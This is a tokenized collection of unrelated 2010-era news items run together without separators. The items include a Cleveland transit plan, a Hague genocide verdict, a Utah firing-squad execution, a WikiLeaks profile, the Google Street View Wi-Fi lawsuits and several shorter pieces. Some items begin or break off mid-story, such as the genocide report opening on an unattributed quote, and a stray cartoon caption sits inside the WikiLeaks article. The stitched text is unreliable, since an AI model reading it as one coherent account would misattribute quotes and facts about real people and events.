" To father " means to be involved from the moment your child enters this world , until the very day that one or both of you leave it .
Hopefully , the more fathers who do this , the fewer stories will appear about the ones who do n't - which would be better for everyone .
After all , you always get better results with praise than criticism .
Every good parent knows that .
Happy Father 's Day .
CLEVELAND , Ohio --
Cleveland plans to build a long - awaited intermodal transportation center near the lakefront to link the new medical mart , convention center and Flats east bank redevelopment .
The center , north of the east edge of Mall C , would serve rail passengers , motorists , pedestrians and bicyclists .
It would likely extend over railroad tracks to just south of the Shoreway and include walkways to the mall and North Coast Harbor , city Planning Director Bob Brown said Tuesday .
Along with hosting a new Amtrak station that would be a stop on the proposed high - speed rail line between Cleveland , Columbus and Cincinnati , the center would offer access to RTA 's waterfront rail line .
The project , which would also include a parking deck and bicycle connectors , could be one of the most complete multimodal centers in the United States , Brown said .
That should help when officials seek money from federal and state agencies to build the facility , which could open in five to 10 years , he said .
The Greater Cleveland Regional Transit Authority in 1997 proposed a transit center at the site for bus lines including Greyhound , taxis , the rapid system and trains .
But as the Flats entertainment district declined and downtown development stalled , RTA decided to build a bus transit center , which will open this fall , near Cleveland State University and may build a second one in the Warehouse District .
Cleveland , which owns the land where the intermodal center will be built , eyed the property as a transportation link in developing the lakefront plan .
Four years ago , the city was awarded $ 718,900 in federal funds by the Federal Transit Administration to plan an intermodal facility , Brown said .
But the money sat unused because all the talk of lakefront development or a new convention center never led to any concrete plans .
Until now .
This month , the city agreed to sell its downtown convention center for Cuyahoga County 's new medical mart complex .
A new , L - shaped convention center beneath Malls B and C will connect with an above - ground mart at the northeast corner of St. Clair Avenue and Ontario Street .
Half of the federal earmark funds , which are administered by RTA , expired two years ago and the other half expires June 30 , which prompted the RTA board on Tuesday to give the money to Cleveland .
The city will provide a 20 percent match , so about $ 432,000 will be available to prepare a plan and preliminary design .
The new intermodal facility will likely be toward the east edge of Mall C so it does n't block a ballroom in the new convention center to be fronted by a 25 - foot - high wall of glass facing Lake Erie .
The total cost is not yet known but All Aboard Ohio , a nonprofit organization promoting rail , estimated in 2009 that a new rail and transportation center north of Mall C would cost about $ 50 million .
“ He was entrenched ” in the operation and “ participated with resolve , ” they wrote .
His “ robust participation in all aspects of the plan demonstrates that he not only knew of the intent to destroy ” the group , but that “ he also shared it , ” the panel said .

Colonel Beara , chief of security of the army main staff , ranked above Colonel Popovic .
As the most senior security officer , “ He had the clearest overall picture of the massive scale and scope of the killing operation , ” the judges said .
He organized logistics and became the massacre ’s “ driving force . ”
He located detention and execution sites and recruited people to help with the killing and the digging of mass graves , court documents said .
A third Bosnian Serb Army officer , Drago Nikolic , 52 , was found guilty of aiding and abetting genocide and sentenced to 35 years .
The four other defendants were convicted of crimes against humanity and other wartime atrocities .
Among them were two generals : Radivoje Miletic , 62 , who was sentenced to 19 years , and Milan Gvero , 72 , who received a five - year prison term .
Vinko Pandurevic , 50 , a brigade commander , got 13 years , and Ljubomir Borovcanin , 50 , a police commander , was sentenced to 17 years .
Genocide has proved difficult to prosecute .
The concept , as defined in the 1948 United Nations resolution establishing the crime , goes beyond mass murder , requiring proof of “ intent to destroy , in whole or in part , a national , ethnical , racial or religious group , as such . ”
The three - judge panel at The Hague ruled that the definition had been met .
“ The scale and nature of the murder operation , with the staggering number of killings , the systematic and organized manner in which it was carried out , the targeting and relentless pursuit of the victims , and the plain intention  apparent from the evidence  to eliminate every Bosnian Muslim male who was captured or surrendered proves beyond reasonable doubt that this was genocide , ” the judges wrote .
The genocide finding is likely to have an impact well beyond this trial .
In Bosnia , Zumra Sehemerovic , who represents an association of massacre survivors , said the recognition of the crime was essential to the victims .

An execution by firing squad in Utah
By Kate Randall
19 June 2010
Ronnie Lee Gardner was executed just after midnight Friday morning by firing squad at a prison in Draper , Utah .
Everything about this state killing — the method employed , the conduct of the authorities , the condemned man ’s personal history , and the reaction of the families of the executed and his victims — speaks to the brutality of both capital punishment and the political establishment in the US that promotes it .
Fourteen people , including nine journalists from the local media , witnessed the gruesome event .
Gardner , 49 , was seated in a straight - backed metal chair , raised up on a platform .
According to AP account , his hooded head was “ secured by a strap across his forehead .
Harness - like straps constrained his chest .
His handcuffed arms hung at his sides .
A white cloth square affixed to his chest over his heart — maybe 3 inches across — bore a black target . ”
A prison official began a countdown from five .
At two , five marksmen — police officers who had volunteered for the duty — took aim with Winchester rifles from 25 feet away , firing through a slot in a wall to obscure the gunmen ’s identities .
Four of the rifles were loaded with a single live bullet .
The fifth contained an “ ineffective ” round , which gives the same recoil as a live bullet , in an effort to conceal who fired the fatal shot .
Reporter Jennifer Dobner provided the following description : “ Seconds before the impact of the bullets , Gardner ’s left thumb twitched against his forefinger .
When his chest was pierced , he clenched his fist .
His arm pulled up slowly as if he were lifting something and then released .
The motion repeated . ”
The white target over Gardner ’s heart darkened with blood .
A prison medical employee came in two minutes after the shooting and lifted the prisoner ’s hood .
The Guardian reports : “ Gardner ’s face was revealed , looking ashen , and his head was slumped backwards .
He was pronounced dead at 12:17 a.m. ”
Newsweek writes : “ Blood pooled around his waist … .
Four bullet holes in a wall and a smell of bleach were the only evidence that remained . ”
State authorities made the grim announcement of Gardner ’s death via Twitter .
In a series of tweets leading up to the state killing , Utah Attorney General Mark Shurtleff , a Republican , wrote , “ Barring a stay by Sup. Ct. & with my final nod , Utah will use most extreme power & execute a killer , ” and , just moments before the killing , “ I just gave the go ahead to the Corrections Director to proceed with Gardner ’s execution . ”
Outside the prison , members of the executed man ’s family held a candlelight vigil , joined by dozens of anti-death penalty protesters .
On news of his death from prison authorities , they released multicolored balloons into the night sky .
Since the US Supreme Court reinstated the death penalty in 1977 , three people have been executed by firing squad in the US , all of them in Utah .
Gary Gilmore , the first person put to death after the reinstitution of capital punishment , was executed in this manner on January 17 , 1977 .
Of the 49 executions carried out in the state over the past 160 years , 40 have been by firing squad .
Utah outlawed firing squad executions in 2004 , but because Ronnie Gardner was sentenced before this date , he was given the option of choosing this method , and he faced the barrage of bullets after all of his efforts to avoid execution had been exhausted .
The state Board of Pardons and Parole ruled Monday against commuting Gardner ’s sentence to life in prison .
On Tuesday , the Utah Supreme Court denied his request for a stay of execution .
A federal judge on Tuesday also declined to block the execution , rejecting Gardner ’s claims that procedures related to his two - day commutation hearing had violated his civil rights .
The US Supreme Court rejected on Thursday a last - minute request on Gardner ’s behalf to stay the execution .
Utah Governor Gary Herbert , a Republican , also rejected two appeals by the condemned man ’s attorneys to stop it .
Gardner was convicted in the 1985 shooting death of attorney Michael Burdell during a failed escape attempt at a Salt Lake City courthouse .
He was appearing for a pre-trial hearing in the murder of Melvyn Otterstrom , who was fatally shot in a Salt Lake City bar in 1984 at age 37 .
Commenting on the execution to the Deseret News , Melvyn ’s sister Carolyn Crawford said , “ It bothers me it took so long .
It needs to be over and done .
It just needs to end . "
Gardner also wounded bailiff George “ Nick ” Kirk in the courthouse shooting , who died 11 years later as a result of his injuries , according to his family .
VelDean Kirk said her husband ’s life in the ensuing years was marred by depression and excruciating pain .
She had commented on Gardner ’s impending execution , “ It ’ll be a closure , because for 25 years , it has n’t closed a bit . ”
Gardner had never denied that he shot the three men .
His attorneys , however , argued to the end that the jury that sentenced him to death had not heard mitigating evidence that might have resulted in his life being spared .
At his recent parole hearing , Gardner asked that experiences from his childhood be taken into account .
The Guardian related some of the details Gardner asked the authorities to consider : “ He reminded them that aged two he was found wandering the streets alone , severely malnourished and dressed only in a nappy .
At five , he was sexually abused by an older sister and her friend .
At six he was sniffing glue .
By 10 he was addicted to hard drugs , and by 14 he was being put out to work as a prostitute by a pedophile who was allowed to become his foster parent . ”
In recent years , Ronnie Gardner had worked with his brother Randy to establish a project for abused children .
They bought a plot of land in northern
Utah where they planned to operate an organic farm to be used in therapy for troubled children .
Joseph Burdell Jr. , father of the attorney Gardner murdered , commented to AP that Gardner ’s expressed desire to help children provided some evidence that he had changed over his 25 years in prison .
Donna Nu , Michael Burdell ’s partner , speaking at Gardner ’s parole hearing , said Michael would n’t have wanted Gardner to die .
“ He certainly would n’t want to be the reason that Ronnie Lee was killed , ” she said .
As Gardner ’s execution approached , Donna Taylor , Michael Burdell ’s niece , and Ashley Gardner , niece of Ronnie Lee Gardner , stood in a parking lot overlooking the Salt Lake City nightscape , having chosen not to join the others outside the prison .
The young women hugged and wept when they received news of Gardner ’s execution .
Ashley told the Guardian , “ I love him , he was a great guy .
I ’m hurt because I do n’t believe murder justifies murder . ”
Earlier that evening , Donna related that the day he died her uncle was doing voluntary legal work .
She said he had a hatred of violence or killing of any kind .
“ Mike was totally against the death penalty , ” she said .
“ He would not have wanted this ; he would have said this does n’t do any good . ”

According to the Espy File , a database of executions in the United States and the earlier colonies from 1608 to 2002 , an estimated 142 men have been judicially shot in the US and English - speaking predecessor territories since 1608 .
While reliable figures are not available for the Civil War , there were reportedly several hundred during this period for offenses including killing a superior officer or fellow soldier , or espionage .
Historically , execution by firing squad has been particularly common in wartime , used by the military as punishment for crimes of cowardice , desertion or mutiny .
While generally carried out by a squad , a single shot to the head — a coup de grace — has sometimes been utilized if the initial shots fail to kill the targeted person .
Following
Utah ’s prohibition of firing squads for execution in 2003 , Idaho enacted a similar ban in 2009 .
At present , Oklahoma is the only US state where the firing squad is available as an option .
While state killing by firing squad — along with the electric chair — is on the wane , the US political establishment is continually engaged in efforts to define what constitutes a “ humane ” method of capital punishment .
Lethal injection of toxic chemicals is now the preferred method among official circles , despite evidence that this procedure can cause agonizing pain and suffocation .
Politicians of both big business parties and the US Supreme Court debate whether lethal injection constitutes “ cruel and unusual punishment , ” and whether the mentally disabled , juvenile offenders , or other sections of the population should be subject to the death penalty .
All of this is done with the aim of preserving a barbaric practice that has no place in a civilized society , and which has been outlawed by the vast majority of developed nations .
Here ’s a glimmer of hope for those die - hard fans of The Lord of the Rings ( like me ) who hope that Peter Jackson will realize the best director for The Hobbit is the one he sees in the mirror each morning .
My sources say that nobody has been offered the helming job — yet .
Instead , Warner Bros and MGM brass are doing all they can to sell Jackson on the seemingly obvious notion that he should complete the franchise he started with three LOTR films that grossed $ 2.9 billion worldwide .
Particularly since he co-wrote the scripts for the two Hobbit movies and already is producing and can shoot both in his backyard .
One of the rumored reasons that prompted one - time director Guillermo del Toro ’s recent exit , I hear , was the prospect of transplanting his family to New Zealand , where Jackson has his visual effects factory and is so comfortable shooting .
Warner Bros and MGM braintrust will keep pursuing him until Jackson gives a definitive no .
Other filmmakers are interested in replacing del Toro .
Sources tell me David Yates , David Dobkin , and the ubiquitous Brett Ratner are among them .
One tricky part of the equation is the deal numbers .
So much gross already has been committed on the picture that there is n’t much left to give to a top - level director .
Sources tell me that gross participants include the JRR Tolkien estate , Jackson , Saul Zaentz , even Harvey Weinstein , who bargained for a 5 % gross stake in the original trilogy .
( That happened when Michael Eisner refused to finance two LOTR films , and Weinstein gave Jackson a short turnaround window to shop the property .
Jackson made the trilogy deal with Bob Shaye at New Line right before that turnaround window closed ) .
No matter who gets the gig , they ’ll have to accept a creative deal or the financing studios will be hard pressed to make money .
A former Santa Ana police officer who worked as an unlicensed private investigator was charged Friday with 63 counts , ranging from defrauding clients to intimidating witnesses to posting ads on Craigslist seeking women to engage in sex acts with his Labrador retriever .
Kevin Michael Sianez , 53 , of Fountain Valley is also charged with illegally operating a private investigation service without a license , according to the Orange County district attorney ’s office .
Sianez opened his office in 2005 and employed five people , most of whom were family members , the district attorney ’s office said .
He allegedly posted false reviews of his business on the Internet , misleading potential clients into believing his business had nationwide offices and investigators .
He also is accused of attempting to dissuade two former employees who tried to report his actions to the police , the district attorney ’s office said .
The house on Grettisgata Street , in Reykjavik , is a century old , small and white , situated just a few streets from the North Atlantic .
The shifting northerly winds can suddenly bring ice and snow to the city , even in springtime , and when they do a certain kind of silence sets in .
This was the case on the morning of March 30th , when a tall Australian man named Julian Paul Assange , with gray eyes and a mop of silver - white hair , arrived to rent the place .
Assange was dressed in a gray full - body snowsuit , and he had with him a small entourage .
“ We are journalists , ” he told the owner of the house .
Eyjafjallajökull had recently begun erupting , and he said , “ We ’re here to write about the volcano . ”
After the owner left , Assange quickly closed the drapes , and he made sure that they stayed closed , day and night .
The house , as far as he was concerned , would now serve as a war room ; people called it the Bunker .
Half a dozen computers were set up in a starkly decorated , white - walled living space .
Icelandic activists arrived , and they began to work , more or less at Assange ’s direction , around the clock .
Their focus was Project B— Assange ’s code name for a thirty - eight - minute video taken from the cockpit of an Apache military helicopter in Iraq in 2007 .
The video depicted American soldiers killing at least eighteen people , including two Reuters journalists ; it later became the subject of widespread controversy , but at this early stage it was still a closely guarded military secret .
Assange , the founder of WikiLeaks , oversees a populist intelligence network .
Digitally altered photograph by Phillip Toledano
Assange is an international trafficker , of sorts .
He and his colleagues collect documents and imagery that governments and other institutions regard as confidential and publish them on a Web site called WikiLeaks.org .
Since it went online , three and a half years ago , the site has published an extensive catalogue of secret material , ranging from the Standard Operating Procedures at Camp Delta , in Guantánamo Bay , and the “ Climategate ” e-mails from the University of East Anglia , in England , to the contents of Sarah Palin ’s private Yahoo account .
The catalogue is especially remarkable because WikiLeaks is not quite an organization ; it is better described as a media insurgency .
It has no paid staff , no copiers , no desks , no office .
Assange does not even have a home .
He travels from country to country , staying with supporters , or friends of friends — as he once put it to me , “ I ’m living in airports these days . ”
He is the operation ’s prime mover , and it is fair to say that WikiLeaks exists wherever he does .
At the same time , hundreds of volunteers from around the world help maintain the Web site ’s complicated infrastructure ; many participate in small ways , and between three and five people dedicate themselves to it full time .
Key members are known only by initials — M , for instance — even deep within WikiLeaks , where communications are conducted by encrypted online chat services .
The secretiveness stems from the belief that a populist intelligence operation with virtually no resources , designed to publicize information that powerful institutions do not want public , will have serious adversaries .
Iceland was a natural place to develop Project B .
In the past year , Assange has collaborated with politicians and activists there to draft a free - speech law of unprecedented strength , and a number of these same people had agreed to help him work on the video in total secrecy .
The video was a striking artifact — an unmediated representation of the ambiguities and cruelties of modern warfare — and he hoped that its release would touch off a worldwide debate about the conflicts in Iraq and Afghanistan .
He was planning to unveil the footage before a group of reporters at the National Press Club , in Washington , on April 5th , the morning after Easter , presumably a slow news day .
To accomplish this , he and the other members of the WikiLeaks community would have to analyze the raw video and edit it into a short film , build a stand - alone Web site to display it , launch a media campaign , and prepare documentation for the footage — all in less than a week ’s time .
Assange also wanted to insure that , once the video was posted online , it would be impossible to remove .
He told me that WikiLeaks maintains its content on more than twenty servers around the world and on hundreds of domain names .
( Expenses are paid by donations , and a few independent well - wishers also run “ mirror sites ” in support . )
Assange calls the site “ an uncensorable system for untraceable mass document leaking and public analysis , ” and a government or company that wanted to remove content from WikiLeaks would have to practically dismantle the Internet itself .
So far , even though the site has received more than a hundred legal threats , almost no one has filed suit .
Lawyers working for the British bank Northern Rock threatened court action after the site published an embarrassing memo , but they were practically reduced to begging .
A Kenyan politician also vowed to sue after Assange published a confidential report alleging that President Daniel arap Moi and his allies had siphoned billions of dollars out of the country .
The site ’s work in Kenya earned it an award from Amnesty International .
Assange typically tells would - be litigants to go to hell .
In 2008 , WikiLeaks posted secret Scientology manuals , and lawyers representing the church demanded that they be removed .
Assange ’s response was to publish more of the Scientologists ’ internal material , and to announce , “ WikiLeaks will not comply with legally abusive requests from Scientology any more than WikiLeaks has complied with similar demands from Swiss banks , Russian offshore stem - cell centers , former African kleptocrats , or the Pentagon . ”
In his writing online , especially on Twitter , Assange is quick to lash out at perceived enemies .
By contrast , on television , where he has been appearing more frequently , he acts with uncanny sang - froid .
Under the studio lights , he can seem — with his spectral white hair , pallid skin , cool eyes , and expansive forehead — like a rail - thin being who has rocketed to Earth to deliver humanity some hidden truth .
This impression is magnified by his rigid demeanor and his baritone voice , which he deploys slowly , at low volume .
In private , however , Assange is often bemused and energetic .
He can concentrate intensely , in binges , but he is also the kind of person who will forget to reserve a plane ticket , or reserve a plane ticket and forget to pay for it , or pay for the ticket and forget to go to the airport .
People around him seem to want to care for him ; they make sure that he is where he needs to be , and that he has not left all his clothes in the dryer before moving on .
At such times , he can seem innocent of the considerable influence that he has acquired .
Sitting at a small wooden table in the Bunker , Assange looked exhausted .
His lanky frame was arched over two computers — one of them online , and the other disconnected from the Internet , because it was full of classified military documents .
( In the tradecraft of espionage , this is known as maintaining an “ air gap . ” )
He has a cyber - security analyst ’s concern about computer vulnerability , and habitually takes precautions to frustrate eavesdroppers .
A low - grade fever of paranoia runs through the WikiLeaks community .
Assange says that he has chased away strangers who have tried to take his picture for surveillance purposes .
In March , he published a classified military report , created by the Army Counterintelligence Center in 2008 , that argued that the site was a potential threat to the Army and briefly speculated on ways to deter government employees from leaking documents to it .
Assange regarded the report as a declaration of war , and posted it with the title “ U.S. Intelligence Planned to Destroy WikiLeaks . ”
During a trip to a conference before he came to the Bunker , he thought he was being followed , and his fear began to infect others .
“ I went to Sweden and stayed with a girl who is a foreign editor of a newspaper there , and she became so paranoid that the C.I.A. was trying to get me she left the house and abandoned me , ” he said .
Assange was sitting opposite Rop Gonggrijp , a Dutch activist , hacker , and businessman .
Gonggrijp — thin and balding , with a soft voice — has known Assange well for several years .
He had noticed Assange ’s panicky communiqués about being watched and decided that his help was needed .
“ Julian can deal with incredibly little sleep , and a hell of a lot of chaos , but even he has his limits , and I could see that he was stretching himself , ” Gonggrijp told me .
“ I decided to come out and make things sane again . ”
Gonggrijp became the unofficial manager and treasurer of Project B , advancing about ten thousand euros to WikiLeaks to finance it .
He kept everyone on schedule , and made sure that the kitchen was stocked with food and that the Bunker was orderly .
At around three in the afternoon , an Icelandic parliamentarian named Birgitta Jonsdottir walked in .
Jonsdottir , who is in her forties , with long brown hair and bangs , was wearing a short black skirt and a black T - shirt with skulls printed on it .
She took a WikiLeaks T - shirt from her bag and tossed it at Assange .
“ That ’s for you , ” she said .
“ You need to change . ”
He put the T - shirt on a chair next to him , and continued working .
Jonsdottir has been in parliament for about a year , but considers herself a poet , artist , writer , and activist .
Her political views are mostly anarchist .
“ I was actually unemployed before I got this job , ” she explained .
“ When we first got to parliament , the staff was so nervous : here are people who were protesting parliament , who were for revolution , and now we are inside .
None of us had aspirations to be politicians .
We have a checklist , and , once we ’re done , we are out . ”
As she unpacked her computer , she asked Assange how he was planning to delegate the work on Project B. More Icelandic activists were due to arrive ; half a dozen ultimately contributed time to the video , and about as many WikiLeaks volunteers from other countries were participating .
Assange suggested that someone make contact with Google to insure that YouTube would host the footage .
“ To make sure it is not taken down under pressure ? ” she asked .
“ They have a rule that mentions gratuitous violence , ” Assange said .
“ The violence is not gratuitous in this case , but nonetheless they have taken things down .
It is too important to be interfered with . ”
“ What can we ask M to do ? ” Jonsdottir asked .
Assange , engrossed in what he was doing , did n’t reply .
His concerns about surveillance had not entirely receded .
On March 26th , he had written a blast e-mail , titled “ Something Is Rotten in the State of Iceland , ” in which he described a teen - age Icelandic WikiLeaks volunteer ’s story of being detained by local police for more than twenty hours .
The volunteer was arrested for trying to break into the factory where his father worked — “ the reasons he was trying to get in are not totally justified , ” Assange told me — and said that while in custody he was interrogated about Project B. Assange claimed that the volunteer was “ shown covert photos of me outside the Reykjavik restaurant Icelandic Fish & Chips , ” where a WikiLeaks production meeting had taken place in a private back room .
The police were denying key parts of the volunteer ’s story , and Assange was trying to learn more .
He received a call , and after a few minutes hung up .
“ Our young friend talked to one of the cops , ” he said .
“ I was about to get more details , but my battery died . ”
He smiled and looked suspiciously at his phone .
“ We are all paranoid schizophrenics , ” Jonsdottir said .
She gestured at Assange , who was still wearing his snowsuit .
“ Just look at how he dresses . ”
Gonggrijp got up , walked to the window , and parted the drapes to peer out .
“ Someone ? ” Jonsdottir asked .
“ Just the camera van , ” he deadpanned .
“ The brain - manipulation van . ”
At around six in the evening , Assange got up from his spot at the table .
He was holding a hard drive containing Project B .
The video — excerpts of running footage captured by a camera mounted on the Apache — depicts soldiers conducting an operation in eastern Baghdad , not long after the surge began .
Using the Freedom of Information Act , Reuters has sought for three years to obtain the video from the Army , without success .
Assange would not identify his source , saying only that the person was unhappy about the attack .
The video was digitally encrypted , and it took WikiLeaks three months to crack .
Assange , a cryptographer of exceptional skill , told me that unlocking the file was “ moderately difficult . ”
People gathered in front of a computer to watch .
In grainy black - and - white , we join the crew of the Apache , from the Eighth Cavalry Regiment , as it hovers above Baghdad with another helicopter .
A wide - angle shot frames a mosque ’s dome in crosshairs .
We see a jumble of buildings and palm trees and abandoned streets .
We hear bursts of static , radio blips , and the clipped banter of tactical communication .
Two soldiers are in mid-conversation ; the first recorded words are “ O.K. , I got it . ”
Assange hit the pause button , and said , “ In this video , you will see a number of people killed . ”
The footage , he explained , had three broad phases .
“ In the first phase , you will see an attack that is based upon a mistake , but certainly a very careless mistake .
In the second part , the attack is clearly murder , according to the definition of the average man .
And in the third part you will see the killing of innocent civilians in the course of soldiers going after a legitimate target . ”
The first phase was chilling , in part because the banter of the soldiers was so far beyond the boundaries of civilian discourse .
“ Just fuckin ’ , once you get on ’em , just open ’em up , ” one of them said .
The crew members of the Apache came upon about a dozen men ambling down a street , a block or so from American troops , and reported that five or six of the men were armed with AK - 47s ; as the Apache maneuvered into position to fire at them , the crew saw one of the Reuters journalists , who were mixed in among the other men , and mistook a long - lensed camera for an RPG .
The Apaches fired on the men for twenty - five seconds , killing nearly all of them instantly .
“ The market hit new highs today , while the contrition index remained at zero . ”

Phase two began shortly afterward .
As the helicopter hovered over the carnage , the crew noticed a wounded survivor struggling on the ground .
The man appeared to be unarmed .
“ All you gotta do is pick up a weapon , ” a soldier in the Apache said .
Suddenly , a van drove into view , and three unarmed men rushed to help the wounded person .
“ We have individuals going to the scene , looks like possibly , uh , picking up bodies and weapons , ” the Apache reported , even though the men were helping a survivor , and were not collecting weapons .
The Apache fired , killing the men and the person they were trying to save , and wounding two young children in the van ’s front seat .
In phase three , the helicopter crew radioed a commander to say that at least six armed men had entered a partially constructed building in a dense urban area .
Some of the armed men may have walked over from a skirmish with American troops ; it is unclear .
The crew asked for permission to attack the structure , which they said appeared abandoned .
“ We can put a missile in it , ” a soldier in the Apache suggested , and the go - ahead was quickly given .
Moments later , two unarmed people entered the building .
Though the soldiers acknowledged them , the attack proceeded : three Hellfire missiles destroyed the building .
Passersby were engulfed by clouds of debris .
Assange saw these events in sharply delineated moral terms , yet the footage did not offer easy legal judgments .
In the month before the video was shot , members of the battalion on the ground , from the Sixteenth Infantry Regiment , had suffered more than a hundred and fifty attacks and roadside bombings , nineteen injuries , and four deaths ; early that morning , the unit had been attacked by small - arms fire .
The soldiers in the Apache were matter - of - fact about killing and spoke callously about their victims , but the first attack could be judged as a tragic misunderstanding .
The attack on the van was questionable — the use of force seemed neither thoughtful nor measured — but soldiers are permitted to shoot combatants , even when they are assisting the wounded , and one could argue that the Apache ’s crew , in the heat of the moment , reasonably judged the men in the van to be assisting the enemy .
Phase three may have been unlawful , perhaps negligent homicide or worse .
Firing missiles into a building , in daytime , to kill six people who do not appear to be of strategic importance is an excessive use of force .
This attack was conducted with scant deliberation , and it is unclear why the Army did not investigate it .
Assange had obtained internal Army records of the operation , which stated that everyone killed , except for the Reuters journalists , was an insurgent .
And the day after the incident an Army spokesperson said , “ There is no question that Coalition Forces were clearly engaged in combat operations against a hostile force . ”
Assange was hoping that Project B would undermine the Army ’s official narrative .
“ This video shows what modern warfare has become , and , I think , after seeing it , whenever people hear about a certain number of casualties that resulted during fighting with close air support , they will understand what is going on , ” he said in the Bunker .
“ The video also makes clear that civilians are listed as insurgents automatically , unless they are children , and that bystanders who are killed are not even mentioned . ”
WikiLeaks receives about thirty submissions a day , and typically posts the ones it deems credible in their raw , unedited state , with commentary alongside .
Assange told me , “ I want to set up a new standard : ‘ scientific journalism . ’
If you publish a paper on DNA , you are required , by all the good biological journals , to submit the data that has informed your research — the idea being that people will replicate it , check it , verify it .
So this is something that needs to be done for journalism as well .
There is an immediate power imbalance , in that readers are unable to verify what they are being told , and that leads to abuse . ”
Because Assange publishes his source material , he believes that WikiLeaks is free to offer its analysis , no matter how speculative .
In the case of Project B , Assange wanted to edit the raw footage into a short film as a vehicle for commentary .
For a while , he thought about calling the film “ Permission to Engage , ” but ultimately decided on something more forceful : “ Collateral Murder . ”
He told Gonggrijp , “ We want to knock out this ‘ collateral damage ’ euphemism , and so when anyone uses it they will think ‘ collateral murder . ’ ”
The video , in its original form , was a puzzle — a fragment of evidence divorced from context .
Assange and the others in the Bunker spent much of their time trying to piece together details : the units involved , their command structure , the rules of engagement , the jargon soldiers used on the radio , and , most important , whether and how the Iraqis on the ground were armed .
“ One of them has a weapon , ” Assange said , peering at blurry footage of the men walking down the street .
“ See all those people standing out there . ”
“ And there is a guy with an RPG over his arm , ” Gonggrijp said .
“ I ’m not sure . ” Assange said .
“ It does look a little bit like an RPG . ”
He played the footage again .
“ I ’ll tell you what is very strange , ” he said .
“ If it is an RPG , then there is just one RPG .
Where are all the other weapons ?
All those guys .
It is pretty weird . ”
The forensic work was made more difficult because Assange had declined to discuss the matter with military officials .
“ I thought it would be more harmful than helpful , ” he told me .
“ I have approached them before , and , as soon as they hear it is WikiLeaks , they are not terribly coöperative . ”
Assange was running Project B as a surprise attack .
He had encouraged a rumor that the video was shot in Afghanistan in 2009 , in the hope that the Defense Department would be caught unprepared .
Assange does not believe that the military acts in good faith with the media .
He said to me , “ What right does this institution have to know the story before the public ? ”
This adversarial mind - set permeated the Bunker .
Late one night , an activist asked if Assange might be detained upon his arrival in the United States .
“ If there is ever a time it was safe for me to go , it is now , ” Assange assured him .
“ They say that Gitmo is nice this time of year , ” Gonggrijp said .
Assange was the sole decision - maker , and it was possible to leave the house at night and come back after sunrise and see him in the same place , working .
( “ I spent two months in one room in Paris once without leaving , ” he said .
“ People were handing me food . ” )
He spoke to the team in shorthand — “ I need the conversion stuff , ” or “ Make sure that credit - card donations are acceptable ” — all the while resolving flareups with the overworked volunteers .
To keep track of who was doing what , Gonggrijp and another activist maintained a workflow chart with yellow Post - Its on the kitchen cabinets .
Elsewhere , people were translating the video ’s subtitles into various languages , or making sure that servers would n’t crash from the traffic that was expected after the video was posted .
Assange wanted the families of the Iraqis who had died in the attack to be contacted , to prepare them for the inevitable media attention , and to gather additional information .
In conjunction with Iceland ’s national broadcasting service , RUV , he sent two Icelandic journalists to Baghdad to find them .
Parents anticipate sex differences from the first prenatal ultrasound but then seem amazed when their son goes gaga over trucks or their daughter will wear nothing but pink .
Boys and girls are obviously different , and in many cases the gaps between them seem stark .
But stereotypes do not always hold up to scientific scrutiny .
Are boys really more aggressive and girls really more empathetic — or do we just see what we expect in them ?
Where true sex differences exist , are those gaps inborn , as our current Mars - Venus obsession implies , or shaped by environment — that is , by us ?
Pushy California gubernatorial candidate and ex-eBay CEO Meg Whitman has given her campaign another $ 20 million of her personal wealth , bringing the total to $ 90 million , mostly to win a primary .
What is wrong with her ?
Whitman , who spent approximately $ 56 per vote to win her Republican primary , has signaled that she will spend up to $ 150 million of her own fortune to purchase this election .
Who does she think she 's kidding ?
We all know that she 'll spend more than that .
She 's really confusing the entire world , here , with this incredible desire to purchase the World 's Worst Job .
California is broke and will be forever until it defaults .
If Whitman were to get her $ 150 million job , she would either have to ( a ) grovel at Barack Obama 's feet for cash , every day or ( b ) become everyone 's favorite politician by instituting harsh austerity measures , like cutting pensions !
( She will actually have to do both , simultaneously .
While balancing a book on her head . )
Why would her Democratic opponent , ex-Gov. Jerry Brown , want this job , too ?
Who knows , but he 's not spending $ 150 million of his own money on it !
Perhaps he would if he could .
Meg Whitman just wants to be president and needs one of those " governor " jobs on her resume .
Which is fine !
Go nuts , if that 's your thing ...
At least three lawsuits have been filed against search engine giant Google for collecting Wi -Fi user data through its Street View cameras .
The lawsuits have been filed in California , Massachusetts and Oregon .
They allege that Google violated federal and state privacy laws in collecting fragments of data from unencrypted wireless networks as its fleet of camera - equipped cars moseyed through neighborhoods snapping pictures .
The Massachusetts lawsuit , filed Tuesday by Galaxy Internet Services , is seeking class - action status for all Wi-FI users in the state who may have been affected , and is asking for $ 10 million in damages .
Robert Carp , the ISP 's president and the plaintiff attorney on the suit , told the Boston Herald that he hoped the case would " send the message that whether information that is sent over someone 's private network is encrypted or not , no one has a right to access it , decode it , and use it for any purpose . "
The Oregon lawsuit is seeking class - action status for residents in Oregon and Washington state whose data may have been collected .
Plaintiffs in that case seek statutory damages of $ 100 a day per plaintiff for each day their data was breached , or $ 10,000 for every instance of illegal data collection .
It also seeks other unspecified punitive damages .
The California suit seeks class - action status for all U.S. residents .
Plaintiffs in the suits are also seeking court orders to prevent Google from destroying the data it collected until plaintiffs can examine it in discovery .
Google has already destroyed data it collected in Ireland and said it has been negotiating with other governments to determine the best way to handle data collected in their countries .
Google admitted earlier this month that its Street View cars have been collecting private content from open Wi -Fi networks for at least three years .
The content included fragments of data that users sent over the networks as a Google car passed through their neighborhood .
This would include web pages users visited or pieces of e-mail , video , audio and document files .
The company called the inadvertent collection " a mistake " and said it was the result of a programming error – code written for an early experimental project wound up in the Street View code , and Google says it did n't realize the error until German privacy authorities began questioning what data Google 's cameras were collecting .
Not everyone believes the plaintiffs in the lawsuits have a winning case .
One attorney noted to The Recorder that the Electronic Communications Privacy Act contains a safe harbor for breaches that involve collections of data that is already publicly accessible .
The plaintiffs also may not have standing for a suit unless they can prove that their personal data specifically was among the information that was collected .

Real life Spider - man catches comic book thief
It ’s every comic book fan ’s fantasy to become a real life superhero and fight crime , and for one man this actually became a reality as he caught a book thief in his own store while dressed in a Spider - man suit .
Michael Baulderstone defended his comic book kingdom in Adelaide , Australia , by nabbing a would - be shoplifter who was trying to swipe an X - Men omnibus worth £ 97 .
He might not have been able to shoot webs from his wrists to catch the bad guy but his ‘ spider - sense ’ led him to rush over and confront the culprit , while other comic fans dressed as Jedi knights blocked his exit .
[ caption ]
